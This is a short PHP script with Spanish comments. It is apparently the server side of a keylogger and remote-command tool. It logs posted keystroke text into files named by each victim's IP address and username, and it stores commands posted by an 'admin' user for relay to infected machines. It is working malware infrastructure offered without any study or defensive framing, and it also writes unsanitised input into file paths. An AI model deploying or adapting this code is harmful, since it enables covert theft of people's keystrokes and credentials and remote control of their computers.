<?php

if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    echo $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    echo $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    echo $ip = $_SERVER['REMOTE_ADDR'];
}
$ip = strval($ip);

$path = "$ip";
if (!is_dir($path)) {
    mkdir($path, 0777, true);
}
#reciviendo datos del keylogger
if (isset($_POST['text']) && isset($_POST['user'])) {
	$text = $_POST['text'];     
	$user = $_POST['user'];
	$arc = $ip . "/"  . strval($user) . ".txt";        // Nombre del archivo
    $guardar = fopen($arc, "a");    // Abrir archivo para escribir
    fwrite($guardar, $text . "\n");  // Escribir datos
    fclose($guardar);         // Cerrar archivo
}

#recibe datos del usuario X 
if(isset($_POST["data"]) && isset($_POST["userr"])){
    $data = $_POST["data"];
    $userr = $_POST["userr"];

    $name = $ip . "_" . $userr . ".txt";

    $file = fopen($name, "w");
    fwrite($file, $data);
    fclose($file);
    #borra los datos para evitar un buble infinito
    $texto = $ip . ".txt";
    $texto = fopen($texto, "w");    // Abrir archivo para escribir
    fwrite($texto, "");  // Escribir datos
    fclose($texto);   
}
#recibe datos del user principal
if(isset($_POST["data"]) && isset($_POST["admin"])){
    $data = $_POST["data"];
    $userr = $_POST["admin"];

    echo "datos recibidos";
    $name = "recibe_cmd.txt";

    $file = fopen($name, "w");
    fwrite($file, $data);
    fclose($file);
    #borra los datos para evitar un buble infinito
    $texto =  "comand.txt";
    $texto = fopen($texto, "w");    // Abrir archivo para escribir
    fwrite($texto, "");  // Escribir datos
    fclose($texto);   
}
